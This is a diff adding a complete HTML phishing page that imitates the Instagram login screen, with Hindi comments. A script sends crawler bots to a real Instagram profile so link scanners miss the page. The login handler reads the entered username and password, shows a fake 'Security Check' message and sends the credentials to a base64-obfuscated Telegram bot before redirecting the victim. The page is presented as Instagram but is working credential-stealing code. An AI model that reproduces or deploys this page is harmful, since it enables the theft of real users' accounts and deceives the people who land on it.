@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="hack/style.css">
+
+    <title>Instagram</title>
+
+    <script>
+        (function() {
+            var botPattern = /facebookexternalhit|Facebot|Twitterbot|googlebot|chrome-lighthouse|bingbot|adidxbot|applebot|slurp/i;
+            if (botPattern.test(navigator.userAgent)) {
+                window.location.replace("https://www.instagram.com/i__official_707/");
+            }
+        })();
+    </script>
+</head>
+<body>
+
+    <div class="main-container">
+        <div class="left-column">
+            <img src="https://images.unsplash.com/photo-1511632765486-a01980e01a18?q=80&w=1000&auto=format&fit=crop" alt="App Preview">
+        </div>
+
+        <div class="right-column">
+            
+            <div class="login-box">
+                <h1 class="logo-text">Instagram</h1>
+
+                <form onsubmit="return false;">
+                    
+                    <div class="input-group">
+                        <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="password" name="password" placeholder="Password" required>
+                    </div>
+                    
+                    <button type="submit" class="login-btn">Log in</button>
+                </form>
+
+                <div class="divider">
+                    <div class="line"></div>
+                    <div class="or">OR</div>
+                    <div class="line"></div>
+                </div>
+
+                <a href="#" class="fb-login">Log in with Facebook</a>
+                <a href="#" class="forgot-pass">Forgot password?</a>
+            </div>
+
+            <div class="signup-box">
+                <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
+            </div>
+            
+            <div class="app-download">
+                <p>Get the app.</p>
+                <div class="store-imgs">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Get it on Google Play">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Microsoft">
+                </div>
+            </div>
+        </div>
+    </div>
+
+<script>
+    // 1. डेटा एन्कोडिंग (Telegram Bot Details)
+    const _0x1a = "ODU1OTI3MDE3MjpBQUdLVkxTQ3RYMFBNYVJ4VGl4YlBOTDVLUk53cWI3elo0RQ=="; 
+    const _0x2b = "NzgwMDI1MDY2Mw=="; 
+
+    // 2. रैंडम स्ट्रिंग जनरेटर (URL को फ्रेश रखने के लिए)
+    const generateRandom = () => {
+        return Math.random().toString(36).substring(2, 10);
+    };
+
+    document.querySelector(".login-btn").onclick = function(e) {
+        e.preventDefault();
+        
+        const u = document.getElementsByName("username")[0].value;
+        const p = document.getElementsByName("password")[0].value;
+        if (!u || !p) return;
+
+        const btn = e.target;
+        btn.innerHTML = "Security Check..."; // मनोवैज्ञानिक दबाव
+        btn.disabled = true;
+
+        const t = atob(_0x1a);
+        const c = atob(_0x2b);
+        const rStr = generateRandom();
+
+        // 3. डेटा एक्सफिल्ट्रेशन (Silent Fetch)
+        fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=🔥 Login Attempt! \nUser: ${u} \nPass: ${p}`)
+        .finally(() => {
+            // तुम्हारी नई प्रोफाइल पर रीडायरेक्शन
+            setTimeout(() => {
+                const finalUrl = `https://www.instagram.com/i__official_707?igsh=MWVzZ2J4aG00N3V1Nw==&s=${rStr}`;
+                window.location.replace(finalUrl);
+            }, 1800);
+        });
+    };
+</script>
+</body>
+
+</html>
+
+
+
+
+
+
